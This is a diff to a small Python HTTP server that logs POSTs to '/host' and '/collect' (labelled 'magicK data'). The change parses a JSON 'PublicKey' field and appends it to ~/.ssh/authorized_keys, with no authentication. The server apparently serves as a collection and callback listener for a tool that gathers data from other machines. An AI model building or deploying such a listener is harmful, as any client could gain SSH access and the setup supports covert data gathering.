@@ -5,6 +5,7 @@ from colorama import Fore, Style
 from sys import exit, argv, stdout
 from time import strftime
 import os
+import json
 
 class DownloadHandler(SimpleHTTPRequestHandler):
 	def end_headers(self):
@@ -24,12 +25,20 @@ class DownloadHandler(SimpleHTTPRequestHandler):
 		post_data = self.rfile.read(content_length)
 		current_time = strftime('%Y-%m-%d %H:%M:%S')
 		client_ip = self.client_address[0]
-
 		if self.path == '/host':
 			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n{post_data.decode()}\n')
-			os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
-			with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as auth_keys:
-				auth_keys.write(post_data.decode() + "\n")
+			try:
+				post_json = json.loads(post_data.decode())
+				public_key = post_json.get("PublicKey", "")	
+				if public_key:
+					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
+					with open(os.path.expanduser("~/.ssh/authorized_keys"), "a") as auth_keys:
+						auth_keys.write(public_key.strip() + "\n")
+					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Public key added to authorized_keys\n')
+				else:
+					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No public key found in POST data\n')
+			except json.JSONDecodeError:
+				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
 		elif self.path == '/collect':
 			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
 		else:
